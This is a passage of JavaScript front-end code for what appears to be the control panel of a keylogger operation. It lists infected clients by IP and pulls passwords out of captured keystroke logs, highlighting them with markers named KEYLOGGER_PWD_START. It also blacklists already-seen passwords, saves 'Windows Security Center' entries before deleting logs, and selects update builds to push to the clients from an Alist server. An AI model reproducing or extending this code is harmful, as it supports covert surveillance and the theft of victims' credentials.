    const keyword = e.target.value.toLowerCase();
    const rows = dom.logsTable.querySelectorAll('tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        // 使用模糊匹配替代精确匹配
        row.style.display = fuzzyMatch(keyword, text) ? '' : 'none';
    });
});

document.getElementById('blacklistSearch')?.addEventListener('input', (e) => {
    const keyword = e.target.value.toLowerCase();
    const rows = document.querySelectorAll('#blacklistTable tr');
    rows.forEach(row => {
        const text = row.textContent.toLowerCase();
        // 使用模糊匹配替代精确匹配
        row.style.display = fuzzyMatch(keyword, text) ? '' : 'none';
    });
});



// 提取密码
// 文件: app.js
// 替换原有的 extractPasswords 函数

async function extractPasswords() {
    try {
        showToast('正在提取密码...', 'success');
        const response = await fetch('/api/extract-passwords', {
            method: 'POST'
        });

        let result;
        const text = await response.text();
        try {
            result = JSON.parse(text);
        } catch (jsonError) {
            throw new Error(`服务器返回非JSON响应: ${text}`);
        }

        if (response.ok && result.success) {
            showToast(`成功提取 ${result.count} 个密码`, 'success');
            lastExtractedPasswords = result.passwords;
            displayExtractedPasswords(result.passwords || []);
            document.getElementById('extractModal').classList.add('show');
        } else {
            const errorMessage = result?.error || result?.message || text || '未知错误';
            showToast(`提取失败: ${errorMessage}`, 'error');
        }
    } catch (e) {
        console.error('提取密码失败:', e);
        showToast('提取请求失败：' + (e.message || '未知错误'), 'error');
    }
}

// 查看密码提取结果
async function viewLatestPasswords() {
    if (lastExtractedPasswords && lastExtractedPasswords.length > 0) {
        displayExtractedPasswords(lastExtractedPasswords);
        document.getElementById('extractModal').classList.add('show');
        return;
    }
    try {
        const response = await fetch('/api/extract-passwords/view');
        if (!response.ok) throw new Error('结果文件不存在');
        const content = await response.text();
        let passwords = parseExtractedPasswords(content);
        // 实时过滤黑名单
        try {
            const blacklistResp = await fetch('/api/blacklist?page=1&limit=10000');
            if (blacklistResp.ok) {
                const data = await blacklistResp.json();
                const set = new Set((data.blacklist || []).map(item => normalizePassword(item.password)));
                passwords = passwords.filter(item => !set.has(normalizePassword(item.password)));
            }
        } catch (e) { console.warn('过滤黑名单失败'); }
        displayExtractedPasswords(passwords);
        document.getElementById('extractModal').classList.add('show');
    } catch (e) {
        console.error('查看密码提取结果失败:', e);
        showToast('查看失败，可能还没有提取过密码', 'error');
    }
}
// 解析提取的密码）
function parseExtractedPasswords(content) {
    const passwords = [];
    const lines = content.split(/\r?\n/);
    let current = null;
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim();
        if (!line) continue;

        const headerMatch = line.match(/^(\d+)\.\s*来自\s*:\s*(.+)$/);
        if (headerMatch) {
            if (current && current.password) passwords.push(current);
            current = {
                index: parseInt(headerMatch[1], 10),
                file: headerMatch[2].trim(),
                window: '',
                timestamp: '',
                password: '',
                rawPassword: ''
            };
            continue;
        }
        if (!current) continue;

        const winMatch = line.match(/^窗口\s*:\s*(.+)$/);
        if (winMatch) { current.window = winMatch[1].trim(); continue; }

        const timeMatch = line.match(/^时间\s*:\s*(.+)$/);
        if (timeMatch) { current.timestamp = timeMatch[1].trim(); continue; }

        const pwdMatch = line.match(/^内容\s*:\s*(.+)$/);
        if (pwdMatch) { current.password = pwdMatch[1].trim(); continue; }

        const rawMatch = line.match(/^原始数据\s*:\s*(.+)$/);
        if (rawMatch) { current.rawPassword = rawMatch[1].trim(); continue; }
    }
    if (current && current.password) passwords.push(current);
    return passwords;
}

//高亮显示
function renderLogPage() {
    const logContentEl = document.getElementById('logContent');
    const pagerEl = document.getElementById('logPager');
    if (!currentLogContent) return;

    // 规范化换行，避免 CRLF 导致搜索失败
    let content = currentLogContent.replace(/\r\n/g, '\n').replace(/\r/g, '\n');

    // 步骤 1：在原始文本中插入高亮占位符
    const rawStart = '[[[KEYLOGGER_RAW_START]]]';
    const rawEnd = '[[[KEYLOGGER_RAW_END]]]';
    const pwdStart = '[[[KEYLOGGER_PWD_START]]]';
    const pwdEnd = '[[[KEYLOGGER_PWD_END]]]';

    // 处理原始密码高亮（优先）
    let rawHighlighted = false;
    if (currentLogHighlightRaw) {
        // 策略1：精确匹配 - 将 ↵ 替换为 \n 进行精确匹配
        let rawSearchText = currentLogHighlightRaw.replace(/↵/g, '\n');
        let rawPattern = escapeRegexSpecialChars(rawSearchText).replace(/\n/g, '(?:\\r\\n|\\n|\\r)');
        let rawRegex = new RegExp(rawPattern, 'gi');
        let replaced = content.replace(rawRegex, (match) => { rawHighlighted = true; return `${rawStart}${match}${rawEnd}`; });
        content = replaced;

        // 策略2：如果精确匹配失败，尝试模糊匹配（移除特殊标记）
        if (!rawHighlighted) {
            rawSearchText = currentLogHighlightRaw.replace(/↵/g, '').replace(/\[[^\]]+\]/g, '').trim();
            if (rawSearchText) {
                rawPattern = escapeRegexSpecialChars(rawSearchText);
                rawRegex = new RegExp(rawPattern, 'gi');
                replaced = content.replace(rawRegex, (match) => { rawHighlighted = true; return `${rawStart}${match}${rawEnd}`; });
                content = replaced;
            }
        }
    }

    // 处理解析后密码高亮
    let pwdHighlighted = false;
    if (currentLogHighlightPassword) {
        const shouldAttemptPassword = currentLogHighlightPassword !== currentLogHighlightRaw || !rawHighlighted;
        if (shouldAttemptPassword) {
            const replaced = content.replace(
                new RegExp(escapeRegexSpecialChars(currentLogHighlightPassword), 'gi'),
                (match) => { pwdHighlighted = true; return `${pwdStart}${match}${pwdEnd}`; }
            );
            content = replaced;
        }
    }

    // 步骤 2：对整个文本进行 HTML 转义
    let html = escapeHtml(content);

    // 步骤 3：将占位符替换为高亮 span
    html = html
        .replace(new RegExp(`${escapeRegexSpecialChars(rawStart)}(.*?)${escapeRegexSpecialChars(rawEnd)}`, 'gs'),
            '<span class="raw-password-highlight">$1</span>')
        .replace(new RegExp(`${escapeRegexSpecialChars(pwdStart)}(.*?)${escapeRegexSpecialChars(pwdEnd)}`, 'gs'),
            '<span class="password-highlight">$1</span>');

    // 步骤 4：分页处理
    const lines = html.split('\n');
    const totalLines = lines.length;
    const maxPage = Math.ceil(totalLines / LOG_PAGE_SIZE) || 1;
    if (currentLogPage > maxPage) currentLogPage = maxPage;
    if (currentLogPage < 1) currentLogPage = 1;

    const start = (currentLogPage - 1) * LOG_PAGE_SIZE;
    const end = Math.min(start + LOG_PAGE_SIZE, totalLines);
    const pageLines = lines.slice(start, end);
    logContentEl.innerHTML = pageLines.join('\n');

    // 步骤 5：分页器渲染
    if (pagerEl) {
        if (maxPage <= 1) {
            pagerEl.innerHTML = '';
        } else {
            pagerEl.innerHTML = `
                <button class="btn btn-sm btn-secondary" ${currentLogPage === 1 ? 'disabled' : ''}
                        onclick="changeLogPage(-1)">
                    <i class="fas fa-chevron-left"></i> 上一页
                </button>
                <span style="margin:0 1rem;color:var(--gray);">第 ${currentLogPage} 页 / ${maxPage} 页 (共 ${totalLines} 行)</span>
                <button class="btn btn-sm btn-secondary" ${currentLogPage === maxPage ? 'disabled' : ''}
                        onclick="changeLogPage(1)">
                    下一页 <i class="fas fa-chevron-right"></i>
                </button>
            `;
        }
    }

    // 步骤 6：自动滚动到高亮区域 - 更智能的定位
    if (currentLogScrollTarget) {
        setTimeout(() => {
            let highlight = document.querySelector('.raw-password-highlight') || document.querySelector('.password-highlight');
            if (highlight) {
                highlight.scrollIntoView({ behavior: 'smooth', block: 'center' });
                highlight.classList.add('blink');
                setTimeout(() => highlight.classList.remove('blink'), 2000);
            } else {
                // 如果没有高亮，尝试搜索原始文本中的关键片段
                let searchFragment = currentLogScrollTarget.replace(/↵/g, '');
                // 移除按键标记，只保留可打印字符
                searchFragment = searchFragment.replace(/\[[^\]]+\]/g, '').substring(0, 50);
                if (searchFragment && searchFragment.trim()) {
                    const contentText = logContentEl.textContent || '';
                    const index = contentText.indexOf(searchFragment);
                    if (index !== -1) {
                        // 计算大致滚动位置
                        const linesBefore = contentText.substring(0, index).split('\n').length;
                        const approxScroll = Math.max(0, (linesBefore - 5) * 16);
                        logContentEl.scrollTop = approxScroll;
                    } else {
                        logContentEl.scrollTop = 0;
                    }
                } else {
                    logContentEl.scrollTop = 0;
                }
            }
        }, 100);
    }
}

function changeLogPage(delta) {
    const lines = currentLogContent.split('\n');
    const maxPage = Math.ceil(lines.length / LOG_PAGE_SIZE) || 1;
    const newPage = currentLogPage + delta;

    if (newPage < 1 || newPage > maxPage) return;
    currentLogPage = newPage;
    renderLogPage();
}

// 显示提取的密码
function displayExtractedPasswords(passwords) {
    currentExtractedPasswords = passwords;   // 保存全量数据
    extractedSearchKeyword = '';             // 重置搜索
    extractedPage = 1;                       // 回到第一页

    // 设置搜索事件（仅绑定一次）
    const searchInput = document.getElementById('extractSearch');
    if (searchInput) {
        searchInput.value = '';
        searchInput.oninput = function() {
            extractedSearchKeyword = this.value.toLowerCase();
            extractedPage = 1;               // 搜索后回到第一页
            renderExtractedPage();
        };
    }

    renderExtractedPage();
}

async function blacklistExtractedPassword(password) {
    if (!password) {
        showToast('无法加入黑名单：密码内容为空', 'error');
        return;
    }

    try {
        const response = await fetch('/api/blacklist', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });

        if (!response.ok) {
            const error = await response.json().catch(() => ({}));
            throw new Error(error.error || '加入黑名单失败');
        }

        // 从全量数组中移除
        currentExtractedPasswords = currentExtractedPasswords.filter(
            item => normalizePassword(item.password) !== normalizePassword(password)
        );

        // 如果当前页没有数据了，自动回退一页
        let filtered = currentExtractedPasswords;
        if (extractedSearchKeyword) {
            filtered = filtered.filter(item =>
                fuzzyMatch(extractedSearchKeyword, item.password || '') ||
                fuzzyMatch(extractedSearchKeyword, item.file || '')
            );
        }
        const total = filtered.length;
        const maxPage = Math.ceil(total / EXTRACT_PAGE_SIZE) || 1;
        if (extractedPage > maxPage && maxPage > 0) {
            extractedPage = maxPage;
        }

        renderExtractedPage();
        showToast('已加入黑名单，后续提取时将跳过该密码', 'success');
    } catch (e) {
        console.error('加入黑名单失败:', e);
        showToast(e.message || '加入黑名单失败', 'error');
    }
}

// 页面关闭前清理定时器
window.addEventListener('beforeunload', () => {
    isUnloading = true;
    stopAutoRefresh();
    if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
    }
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.close();
    }
});

function renderExtractedPage() {
    const listEl = document.getElementById('extractList');
    const statsEl = document.getElementById('extractStats');
    const pagerEl = document.getElementById('extractPager');

    // 1. 根据搜索关键词过滤全量数据
    let filtered = currentExtractedPasswords;
    if (extractedSearchKeyword) {
        filtered = filtered.filter(item =>
            fuzzyMatch(extractedSearchKeyword, item.password || '') ||
            fuzzyMatch(extractedSearchKeyword, item.file || '')
        );
    }

    const total = filtered.length;
    const maxPage = Math.ceil(total / EXTRACT_PAGE_SIZE) || 1;

    // 页码越界保护
    if (extractedPage > maxPage) extractedPage = maxPage;
    if (extractedPage < 1) extractedPage = 1;

    const start = (extractedPage - 1) * EXTRACT_PAGE_SIZE;
    const pageItems = filtered.slice(start, start + EXTRACT_PAGE_SIZE);

    // 2. 更新统计信息
    statsEl.textContent = `共 ${total} 个密码`;

    // 3. 渲染列表
    if (pageItems.length === 0) {
        listEl.innerHTML = `
            <div class="extract-empty">
                <i class="fas fa-key"></i>
                <p>暂无提取的密码</p>
            </div>
        `;
    } else {
        let html = '';
        pageItems.forEach((item) => {
            // 此处的 index 是过滤后数组中的下标，需要找到原始全局索引
            const globalIndex = currentExtractedPasswords.indexOf(item);

            let clientId = '';
            let filename = item.file;
            const ipMatch = item.file.match(/^(\d+\.\d+\.\d+\.\d+)_/);
            if (ipMatch) {
                const ip = ipMatch[1];
                const client = clients.find(c => c.ip === ip);
                clientId = client ? client.id : `${ip}:9999`;
            }

            html += `
            <div class="extract-item">
                <div class="index">${item.index}</div>
                <div class="password-content">
                    ${escapeHtml(item.password || '')}
                    ${item.rawPassword ? `
                        <div class="raw-password" style="font-size: 0.8rem; color: var(--gray); margin-top: 0.5rem;">
                            <span style="font-weight: 600;">原始数据:</span> ${escapeHtml(item.rawPassword)}
                        </div>
                    ` : ''}
                </div>
                <div class="source-file">
                    <a href="javascript:void(0)" class="source-file-link"
                       data-client-id="${escapeHtml(clientId)}"
                       data-filename="${escapeHtml(filename)}"
                       data-password="${escapeHtml(item.password || '')}"
                       data-raw-password="${escapeHtml(item.rawPassword || '')}"
                       style="color: var(--primary); text-decoration: underline; cursor: pointer;">
                        ${escapeHtml(item.file)}
                    </a>
                </div>
                <div class="action-cell">
                    <button class="btn btn-sm btn-secondary blacklist-password-btn"
                            data-global-index="${globalIndex}"
                            style="padding: 0.35rem 0.75rem; min-width: 110px;">
                        不再显示
                    </button>
                </div>
                <div class="timestamp">${escapeHtml(item.timestamp)}</div>
            </div>
            `;
        });
        listEl.innerHTML = html;
    }

    // 4. 更新分页控件
    if (pagerEl) {
        if (maxPage <= 1) {
            pagerEl.innerHTML = '';
        } else {
            pagerEl.innerHTML = `
                <button class="btn btn-sm btn-secondary" ${extractedPage === 1 ? 'disabled' : ''}
                        onclick="changeExtractedPage(-1)">
                    <i class="fas fa-chevron-left"></i> 上一页
                </button>
                <span style="margin: 0 1rem; color: var(--gray);">第 ${extractedPage} 页 / ${maxPage} 页</span>
                <button class="btn btn-sm btn-secondary" ${extractedPage === maxPage ? 'disabled' : ''}
                        onclick="changeExtractedPage(1)">
                    下一页 <i class="fas fa-chevron-right"></i>
                </button>
            `;
        }
    }

    // 5. 委托事件（覆盖式绑定，只处理当前 DOM 中的按钮）
    listEl.onclick = async function(e) {
        // 点击文件名查看日志
        const link = e.target.closest('.source-file-link');
        if (link) {
            const cId = link.dataset.clientId;
            const fname = link.dataset.filename;
            const pwd = link.dataset.password;
            const raw = link.dataset.rawPassword;
            viewLog(cId, fname, { password: pwd, rawPassword: raw });
            return;
        }

        // 点击“不再显示”
        const btn = e.target.closest('.blacklist-password-btn');
        if (btn) {
            const gIdx = parseInt(btn.dataset.globalIndex, 10);
            const password = currentExtractedPasswords[gIdx]?.password;
            if (password) {
                await blacklistExtractedPassword(password);
            }
        }
    };
}

function changeExtractedPage(delta) {
    const total = currentExtractedPasswords.filter(item => {
        if (!extractedSearchKeyword) return true;
        return fuzzyMatch(extractedSearchKeyword, item.password || '') ||
               fuzzyMatch(extractedSearchKeyword, item.file || '');
    }).length;
    const maxPage = Math.ceil(total / EXTRACT_PAGE_SIZE) || 1;
    const newPage = extractedPage + delta;

    if (newPage < 1 || newPage > maxPage) return;
    extractedPage = newPage;
    renderExtractedPage();
}

// 退出登录
function logout() {
    showConfirmModal(
        '退出登录',
        '确定要退出登录吗？',
        () => {
            localStorage.clear();
            sessionStorage.clear();
            window.location.href = '/logout';
        }
    );
}
// 更新当前时间
function updateCurrentTime() {
    const now = new Date();
    const timeElement = document.getElementById('currentTime');
    if (timeElement) {
        timeElement.textContent = now.toLocaleString();
    }
}

// 初始化连接
connectWebSocket();

// 加载 Alist 配置
loadAlistConfig();

// 加载 Alist 配置
async function loadAlistConfig() {
    try {
        const response = await fetch('/api/config');
        const data = await response.json();
        if (data.success) {
            ALIST_BASE_URL = data.config.alistUrl || '';
            ALIST_BASE_PATH = data.config.alistBasePath || '';
            console.log('Alist 配置已加载:', { url: ALIST_BASE_URL, path: ALIST_BASE_PATH });
        }
    } catch (error) {
        console.error('加载 Alist 配置失败:', error);
    }
}

// 加载 Alist 文件列表
async function loadAlistFiles(containerId) {
    const container = document.getElementById(containerId);
    if (!container) return;

    container.innerHTML = '<div class="loading">加载中...</div>';

    try {
        const response = await fetch('/api/alist/files');
        const data = await response.json();

        if (data.success && data.files && data.files.length > 0) {
            renderFileList(containerId, data.files);
        } else {
            container.innerHTML = '<div class="empty">暂无文件</div>';
        }
    } catch (error) {
        console.error('加载文件列表失败:', error);
        container.innerHTML = '<div class="error">加载失败: ' + error.message + '</div>';
    }
}

// 渲染文件列表
function renderFileList(containerId, files) {
    const container = document.getElementById(containerId);
    if (!container) return;

    container.innerHTML = files.map(file => `
        <div class="file-item" onclick="selectAlistFile('${containerId}', '${escapeHtml(file.name)}')">
            <span class="file-name" title="${escapeHtml(file.name)}">${escapeHtml(file.name)}</span>
            <span class="file-size">${formatFileSize(file.size)}</span>
        </div>
    `).join('');
}

// 选择 Alist 文件
function selectAlistFile(containerId, filename) {
    // 取消其他选中状态
    document.querySelectorAll(`#${containerId} .file-item`).forEach(item => {
        item.classList.remove('selected');
    });

    // 选中当前项
    const container = document.getElementById(containerId);
    const items = container.querySelectorAll('.file-item');
    items.forEach(item => {
        if (item.querySelector('.file-name').textContent === filename) {
            item.classList.add('selected');
        }
    });

    // 生成直链并填入输入框
    if (ALIST_BASE_URL && filename) {
        const downloadUrl = `${ALIST_BASE_URL}/d/${filename}`;
        // 根据容器 ID 确定目标输入框
        if (containerId === 'addVersionFileList') {
            document.getElementById('versionUrl').value = downloadUrl;
        } else if (containerId === 'editVersionFileList') {
            document.getElementById('editVersionUrl').value = downloadUrl;
        }
        showToast('已选择文件: ' + filename, 'success');
    }
}

// 格式化文件大小
function formatFileSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + units[i];
}

// 初始化当前时间并每秒更新
updateCurrentTime();
setInterval(updateCurrentTime, 1000);

// ========== 版本管理功能 ==========

// 版本管理状态
let versionLoadingState = false;
let versionRefreshInterval = null;
let allVersions = [];  // 存储所有版本数据

// 加载版本列表
async function loadVersions() {
    const container = document.getElementById('versionsTable');
    if (!container) return; // 不在设置页时直接返回
    
    if (versionLoadingState) return;
    
    versionLoadingState = true;
    const btn = document.querySelector('[onclick="loadVersions()"]');
    const originalHTML = btn ? btn.innerHTML : '';
    
    try {
        if (btn) {
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 加载中...';
        }
        
        const response = await fetch('/api/update/get_version');
        const data = await response.json();
        
        if (data.code === 200) {
            allVersions = data.data.versions;  // 保存所有版本数据
            renderVersionsTable(data.data.versions);
            showToast('版本列表已刷新', 'success');
        } else {
            showToast('加载版本列表失败', 'error');
        }
    } catch (error) {
        console.error('加载版本列表失败:', error);
        showToast('加载版本列表失败：' + error.message, 'error');
    } finally {
        versionLoadingState = false;
        if (btn) {
            btn.disabled = false;
            btn.innerHTML = originalHTML;
        }
    }
}

// 搜索/过滤版本
async function filterVersions() {
    const searchInput = document.getElementById('versionSearch');
    if (!searchInput) return;
    
    const keyword = searchInput.value.toLowerCase().trim();
    
    // 实时更新数据库（记录搜索操作）
    try {
        await fetch('/api/update/search_version', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ keyword })
        });
    } catch (error) {
        console.warn('版本搜索记录失败:', error);
    }
    
    // 前端过滤显示
    if (!keyword) {
        renderVersionsTable(allVersions);
        return;
    }
    
    const filtered = allVersions.filter(version =>
        fuzzyMatch(keyword, version.version) ||
        fuzzyMatch(keyword, version.filename)
    );
    
    renderVersionsTable(filtered);
}

// 渲染版本表格
function renderVersionsTable(versions) {
    const container = document.getElementById('versionsTable');

    if (!versions || versions.length === 0) {
        container.innerHTML = '<div style="padding: 2rem; text-align: center; color: var(--gray);">暂无版本信息 - 点击"刷新版本"从Alist获取</div>';
        return;
    }

    let html = `
        <table class="table">
            <thead>
                <tr>
                    <th>版本号</th>
                    <th>激活状态</th>
                    <th>下载链接</th>
                    <th>文件名</th>
                    <th style="width: 200px;">操作</th>
                </tr>
            </thead>
            <tbody>
    `;

    versions.forEach(version => {
        const isActive = version.is_active;
        // 定义激活状态的徽章
        const activeBadge = isActive
            ? '<span class="status-badge status-online" style="font-weight:600;">已激活</span>'
            : '<span class="status-badge status-offline">未激活</span>';

        // 已激活的版本只显示取消激活按钮，未激活的显示“设为激活”按钮
        const actionBtn = isActive
            ? `<div>
                <button class="btn btn-sm btn-warning" onclick="deactivateVersion()">取消激活</button>
               </div>`
            : `<button class="btn btn-sm btn-primary" onclick="setActiveVersion('${escapeHtml(version.version)}')">设为激活</button>`;

        html += `
            <tr>
                <td><strong>${escapeHtml(version.version)}</strong></td>
                <td>${activeBadge}</td>
                <td><small><a href="${escapeHtml(version.downloadUrl)}" target="_blank" class="link" title="${escapeHtml(version.downloadUrl)}">${escapeHtml(version.downloadUrl.substring(0, 40))}...</a></small></td>
                <td><small>${escapeHtml(version.filename)}</small></td>
                <td>${actionBtn}</td>
            </tr>
        `;
    });

    html += `</tbody></table>`;
    container.innerHTML = html;
}

// 前端调用函数
// 取消激活版本
async function deactivateVersion() {
    showConfirmModal(
        '取消激活',
        '确定要取消当前激活的版本吗？',
        async () => {
            try {
                const response = await fetch('/api/update/deactivate', { method: 'POST' });
                const data = await response.json();
                if (data.code === 200) {
                    showToast('已取消激活', 'success');
                    loadVersions();
                } else {
                    showToast(data.message || '取消激活失败', 'error');
                }
            } catch (error) {
                showToast('取消激活请求失败', 'error');
            }
        }
    );
}

// 设置激活版本
async function setActiveVersion(version) {
    showConfirmModal(
        '设置激活版本',
        `确定要将版本 ${version} 设置为激活版本吗？`,
        async () => {
            try {
                const response = await fetch('/api/update/set_version', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ version, force_update: false })
                });
                const data = await response.json();
                if (data.code === 200) {
                    showToast(`版本 ${version} 已设置为激活状态`, 'success');
                    loadVersions();
                } else {
                    showToast(data.message || '设置激活版本失败', 'error');
                }
            } catch (error) {
                console.error('设置激活版本失败:', error);
                showToast('设置激活版本失败：' + error.message, 'error');
            }
        }
    );
}

//手动触发清理过期日志
async function triggerCleanExpiredLogs() {
    showConfirmModal(
        '清理过期日志',
        '确定要清理 Alist 中超过保留天数的日志文件吗？\n' +
        '清理前会自动保存包含“Windows安全中心”的敏感信息到本地文件。',
        async () => {
            try {
                showToast('正在清理过期日志...', 'success');
                const response = await fetch('/api/maintenance/clean-expired-logs', {
                    method: 'POST'
                });
                const result = await response.json();
                if (response.ok && result.success) {
                    showToast('清理完成', 'success');
                } else {
                    showToast('清理失败: ' + (result.error || '未知错误'), 'error');
                }
            } catch (e) {
                console.error('清理过期日志失败:', e);
                showToast('请求失败', 'error');
            }
        }
    );
}

// 扫描过期日志
async function scanExpiredLogs() {
    showToast('正在扫描过期日志...');
    try {
        const response = await fetch('/api/maintenance/scan-expired-logs');
        const data = await response.json();
        if (!data.success) throw new Error(data.error || '扫描失败');
        
        currentExpiredFiles = data.files || [];
        renderExpiredFiles(currentExpiredFiles);
        document.getElementById('expiredLogsModal').classList.add('show');
        
        if (currentExpiredFiles.length === 0) {
            document.getElementById('expiredFileList').innerHTML = 
                '<div class="empty-state"><p>没有需要清理的过期日志</p></div>';
        }

        showToast(`发现 ${currentExpiredFiles.length} 个过期文件`);
    } catch (e) {
        console.error(e);
        showToast('扫描失败: ' + e.message, 'error');
    }
}

// 渲染过期文件列表
function renderExpiredFiles(files) {
    const container = document.getElementById('expiredFileList');
    const countSpan = document.getElementById('expiredCount');
    countSpan.textContent = files.length;

    if (files.length === 0) return;

    let html = '';
    files.forEach(file => {
        html += `
            <div class="file-item" style="display: flex; align-items: center; padding: 0.5rem 1rem; border-bottom: 1px solid var(--gray-light);">
                <input type="checkbox" class="expired-checkbox" value="${escapeHtml(file.filename)}" checked 
                       onchange="updateSelectAllState()">
                <span style="margin-left: 0.75rem; flex: 1;">${escapeHtml(file.filename)}</span>
                <span style="color: var(--gray); font-size: 0.85rem;">${file.date}</span>
            </div>
        `;
    });
    container.innerHTML = html;

    // 默认全选状态
    document.getElementById('selectAllExpired').checked = true;
}

// 全选/取消全选
function toggleSelectAllExpired() {
    const selectAll = document.getElementById('selectAllExpired').checked;
    const checkboxes = document.querySelectorAll('.expired-checkbox');
    checkboxes.forEach(cb => { cb.checked = selectAll; });
}

// 更新全选状态（当某个复选框手动切换时）
function updateSelectAllState() {
    const checkboxes = document.querySelectorAll('.expired-checkbox');
    const allChecked = Array.from(checkboxes).every(cb => cb.checked);
    document.getElementById('selectAllExpired').checked = allChecked;
}

// 删除选中的过期日志
async function deleteSelectedExpired() {
    const checkboxes = document.querySelectorAll('.expired-checkbox');
    const selected = Array.from(checkboxes)
        .filter(cb => cb.checked)
        .map(cb => cb.value);

    if (selected.length === 0) {
        showToast('请至少选择一个文件', 'error');
        return;
    }

    showConfirmModal(
        '确认删除',
        `将删除选中的 ${selected.length} 个日志文件，删除前会自动保存敏感信息。\n此操作不可恢复！`,
        async () => {
            hideModal('expiredLogsModal');
            showToast('正在清理选中的日志...');
            try {
                const response = await fetch('/api/maintenance/clean-selected-logs', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ filenames: selected })
                });
                const data = await response.json();
                if (data.success) {
                    showToast(`成功删除 ${data.totalClean} 个文件，保存 ${data.totalSaved} 条敏感信息`, 'success');
                    // 清理成功后，可以再次扫描，或者直接从列表中移除已删除的文件
                    // 这里选择重新扫描以刷新状态
                    // scanExpiredLogs(); // 可选
                } else {
                    showToast('清理失败: ' + (data.error || '未知错误'), 'error');
                }
            } catch (e) {
                console.error(e);
                showToast('请求失败: ' + e.message, 'error');
            }
        }
    );
}

// 一键清理全部
async function cleanAllExpired() {
    // 直接复用原有的全清接口
    showConfirmModal(
        '一键清理全部过期日志',
        '确定要删除所有超过保留天数的日志吗？删除前会自动保存敏感信息。',
        async () => {
            showToast('正在清理所有过期日志...');
            try {
                const response = await fetch('/api/maintenance/clean-expired-logs', { method: 'POST' });
                const data = await response.json();
                if (data.success) {
                    showToast('已清理所有过期日志', 'success');
                } else {
                    showToast('清理失败: ' + (data.error || '未知错误'), 'error');
                }
            } catch (e) {
                console.error(e);
                showToast('请求失败', 'error');
            }
        }
    );
}

// 页面加载时设置保留天数显示
function showRetentionDays() {
    const span = document.getElementById('retentionDaysSpan');
    if (span) {
        span.textContent = '30'; // 默认值，可以替换为真实获取
    }
}